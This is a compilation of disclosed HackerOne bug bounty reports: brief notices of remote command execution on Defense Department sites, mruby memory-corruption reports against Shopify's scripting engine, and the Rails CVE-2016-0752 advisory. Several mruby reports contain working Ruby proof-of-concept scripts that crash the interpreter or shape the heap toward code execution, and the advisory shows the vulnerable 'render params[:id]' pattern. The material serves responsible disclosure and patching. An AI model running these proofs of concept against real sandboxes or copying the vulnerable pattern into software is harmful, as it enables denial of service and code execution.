A remote command execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. @japp1 was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks @japp1!

---

### [Type confusion in wrap_decimal leading to memory corruption](https://hackerone.com/reports/185051)

- **Report ID:** `185051`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** shopify-scripts
- **Reporter:** @raydot
- **Bounty:** - usd
- **Disclosed:** 2017-01-15T20:03:46.620Z
- **CVE(s):** -

**Vulnerability Information:**

Decimal can be redefined, causing the Decimal class lookup in wrap_decimal to be invalid. This can lead to memory corruption or arbitrary code execution.

The following snippet results in a native crash in mruby-engine
    olddecimal = Decimal.new(1)
    Decimal = Hash
    a = -olddecimal
    puts a

I suspect you caught this along with charliesome's similar bug for Struct. If not I'll follow up with a patch and an RCE exploit.

---

### [Remote code execution on an Army website](https://hackerone.com/reports/188284)

- **Report ID:** `188284`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @meals
- **Bounty:** - usd
- **Disclosed:** 2017-01-12T16:22:15.542Z
- **CVE(s):** -

**Summary (team):**

A webserver hosted by the U.S. Army allowed the execution of local shell commands. meals was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks meals!

---

### [RCE on a Department of Defense website](https://hackerone.com/reports/184279)

- **Report ID:** `184279`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @dawgyg
- **Bounty:** - usd
- **Disclosed:** 2017-01-11T20:34:01.514Z
- **CVE(s):** -

**Summary (team):**

A misconfigured webserver hosted by the Department of Defense allowed the execution of local shell commands. dawgyg was able to demonstrate this vulnerability by crafting a particularly formatted URL. Thanks dawgyg!

---

### [Struct type confusion RCE](https://hackerone.com/reports/181879)

- **Report ID:** `181879`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** shopify-scripts
- **Reporter:** @h72
- **Bounty:** 18000 usd
- **Disclosed:** 2016-12-17T01:03:22.530Z
- **CVE(s):** -

**Vulnerability Information:**

Heya!

I've been poking at mruby a bit more and I've found a vulnerability that allows an attacker to take control of the instruction pointer.

I've attached a proof of concept script that when run in mruby will jump to `0x0000133713371337` and segfault.

While the proof of concept script just jumps to an attacker controlled address and crashes, it would almost certainly be possible to achieve full remote code execution, especially given an arbitrary read/write primitive (which is easily created using the same techniques as in the proof of concept)

The proof of concept script has detailed annotations throughout about how it works, but I'm also happy to clarify anything if need be :)

Cheers,

███████

---

### [TOCTTOU bug in mrb_str_setbyte leading the memory corruption](https://hackerone.com/reports/181893)

- **Report ID:** `181893`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** shopify-scripts
- **Reporter:** @raydot
- **Bounty:** - usd
- **Disclosed:** 2016-12-16T21:35:57.209Z
- **CVE(s):** -

**Vulnerability Information:**

The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.

Following is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.

```
$s = "9" + ("\n" * (1024*1024-1))
$k = []

class Tmp
    def to_i
        $k.push("a"*1024)
        $s.chomp! ''
        $s.succ!
        95
    end
end
tmp = Tmp.new
$s.setbyte(128, tmp)
puts $k[0]
```

Attached is a patch to mruby to resolve this issue.

---

### [Use after free vulnerability in mruby Array#to_h causing DOS possible RCE](https://hackerone.com/reports/181321)

- **Report ID:** `181321`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** shopify-scripts
- **Reporter:** @isra17
- **Bounty:** - usd
- **Disclosed:** 2016-12-16T20:05:00.076Z
- **CVE(s):** -

**Vulnerability Information:**

This bug was found with `jmlb337`.

## Vulnerability 
The function `to_h` will call the C function  `mrb_ary_to_h`.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call `to_ary` method of that object.  If `to_ary` does not return an array, the function will raise a ruby exception with the class name in the exception message.

However, the code does not properly check that the array length was not modified during the call of `to_ary`. The vulnerability is triggered when the array is shrunk during call to `to_ary`, letting `mrb_ary_to_h` read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the `to_ary` call. A `mrb_obj_iv_set` call done on the controlled class pointer can be used to have a memory write leading to RCE.


## Reproduction Step
1. Define a new class that will define the method `to_ary`.
2. in the `to_ary` clear a global array that will be later define and return a non array object.
3. Create the global array containing an instance of the defined class.
4. Call `to_h` on that array.

## PoC DOS
```ruby
class A
  def to_ary
    $a.clear
    nil
  end
end
$a = [A.new]
$a.to_h
```
This POC will cause a null memory access and terminate the mruby process.

## Explaination
The bug is triggered due to call back to `to_ary` in [array.c:130](https://github.com/mruby/mruby/blob/master/mrbgems/mruby-array-ext/src/array.c#L130): 
```c
 v = mrb_check_array_type(mrb, RARRAY_PTR(ary)[i]);
```

The function `mrb_check_array_type` check if the element at `RARRAY_PTR(ary)[i]`.  in the case of the POC it will be of type `A`.  It will then continue to call the `to_ary` method of the `A` class to convert the value into an array.

```c
MRB_API mrb_value
mrb_check_array_type(mrb_state *mrb, mrb_value ary)
{
  return mrb_check_convert_type(mrb, ary, MRB_TT_ARRAY, "Array", "to_ary");
}

MRB_API mrb_value
mrb_check_convert_type(mrb_state *mrb, mrb_value val, enum mrb_vtype type, const char *tname, const char *method)
{
  mrb_value v;

  if (mrb_type(val) == type && type != MRB_TT_DATA) return val;
  v = convert_type(mrb, val, tname, method, FALSE);
  if (mrb_nil_p(v) || mrb_type(v) != type) return mrb_nil_value();
  return v;
}
```

By calling the `Array#clear` method on the global array, the pointer to the array data (`ptr`) will be set to null.
```c
MRB_API mrb_value
mrb_ary_clear(mrb_state *mrb, mrb_value self)
{
...
  a->len = 0;
  a->aux.capa = 0;
  a->ptr = 0;
...
```

Since `to_ary` will not return an array, the C code will attempt to raise an exception with the class name in the exception message.
```c
 if (mrb_nil_p(v)) {
      mrb_raisef(mrb, E_TYPE_ERROR, "wrong element type %S at %S (expected array)",
        mrb_str_new_cstr(mrb,  mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])),
```
when it calls `RARRAY_PTR(ary)[i]` it will attempt to reference `0[i]` and crash the process.

## Exploitability

The vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.

## Impact

This vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.

We are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with François Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug [#181319](https://hackerone.com/reports/181319) to get a memory disclosure.

## Possible Remote Code Execution POC #2
```ruby
$size = 32
$bb = []
for i in 0..256
 $bb.push("b"*$size)
end

class A
 def to_ary
   $bb.clear
   $a.clear
   $a.push("b"*256)
   #first byte is 0 as long as the lsb != 1 its fine
   $a.push("\x00bcdefg\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY"*3 + ("a"*200))
   $a.push("y"*256)
   $a.push("e"*256)

   return "a"
 end
end

$a = [[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],A.new]

for i in 0..256
 $bb.push("z"*$size)
end

@a = $a.to_h
```

## Exploitation
In the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.

after clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.

by pushing the large strings the data of the strings will be placed after the array data.  When the call is made to `mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])`,
user controlled data will be returned.  

An attacker could then craft an `mrb_value` object using the strings and cause farther memory corruption.

There exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.

## Proposed Fix

See patch in attachment.

---

### [Explicit, dynamic render path: Dir. Trav + RCE](https://hackerone.com/reports/46019)

- **Report ID:** `46019`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Ruby on Rails
- **Reporter:** @forced-request
- **Bounty:** 500 usd
- **Disclosed:** 2016-02-12T18:52:10.202Z
- **CVE(s):** -

**Summary (team):**

Possible Information Leak Vulnerability in Action View

There is a possible directory traversal and information leak vulnerability in
Action View. This vulnerability has been assigned the CVE identifier
CVE-2016-0752.

Versions Affected:  All.
Not affected:       None.
Fixed Versions:     5.0.0.beta1.1, 4.2.5.1, 4.1.14.1, 3.2.22.1

Impact
------
Applications that pass unverified user input to the `render` method in a
controller may be vulnerable to an information leak vulnerability.

Impacted code will look something like this:

```ruby
def index
  render params[:id]
end
```

Carefully crafted requests can cause the above code to render files from
unexpected places like outside the application's view directory, and can
possibly escalate this to a remote code execution attack.

All users running an affected release should either upgrade or use one of the
workarounds immediately.

Releases
--------
The FIXED releases are available at the normal locations.

Workarounds
-----------
A workaround to this issue is to not pass arbitrary user input to the `render`
method.  Instead, verify that data before passing it to the `render` method.

For example, change this:

```ruby
def index
  render params[:id]
end
```

To this:

```ruby
def index
  render verify_template(params[:id])
end

private
def verify_template(name)
  # add verification logic particular to your application here
end
```

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 3-2-render_data_leak.patch - Patch for 3.2 series
* 4-1-render_data_leak.patch - Patch for 4.1 series
* 4-2-render_data_leak.patch - Patch for 4.2 series
* 5-0-render_data_leak.patch - Patch for 5.0 series

Please note that only the 4.1.x and 4.2.x series are supported at present. Users
of earlier unsupported releases are advised to upgrade as soon as possible as we
cannot guarantee the continued availability of security fixes for unsupported
releases.

Credits
-------
Thanks John Poulin for reporting this!

---
